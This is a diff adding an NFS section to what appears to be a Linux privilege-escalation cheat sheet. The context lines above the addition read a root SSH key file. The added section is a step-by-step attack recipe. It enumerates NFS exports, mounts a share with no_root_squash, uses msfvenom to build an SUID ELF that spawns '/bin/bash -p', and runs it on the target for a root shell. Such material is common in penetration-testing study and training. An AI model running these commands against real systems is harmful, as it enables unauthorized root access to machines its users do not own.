@@ -125,3 +125,45 @@ ls -l /.ssh
 cat /.ssh/root_key
 ```
 
+## NFS
+NFS (Network File System) is a popular distributed file system.
+NFS shares are configured in the /etc/exports file.
+Remote users can mount shares, access, create, modify files.
+By default, created files inherit the remote user’s id and group id 
+(as owner and group respectively), even if they don’t exist on the 
+NFS server.
+- Show the NFS server’s export list:
+  - showmount -e <target>
+- Similar Nmap script:
+  - nmap –sV –script=nfs-showmount <target>
+- Mount an NFS share:
+  - mount -o rw,vers=2 <target>:<share> <local_directory>
+
+1. Check the contents of /etc/exports for shares with the no_root_squash option:
+```
+cat /etc/exports
+```
+2. Confirm that the NFS share is available for remote mounting
+```
+showmount -e <target>
+```
+3. Create a mount point on your local machine and mount the /tmp NFS share
+```
+mkdir /tmp/nfs
+mount -o rw,vers=2 <target>:<share> /tmp/nfs
+```
+4. Using the root user on your local machine, generate a payload and save it to the mounted share 
+```
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+```
+5. Make sure the file has the SUID bit set, and is executable by everyone:
+  ```
+  chmod +xs /tmp/nfs/shell.elf
+  ```
+6. On the target machine, execute the file to get a root shell:
+  ```
+  /tmp/shell.elf
+  ```
+  
+  
+  
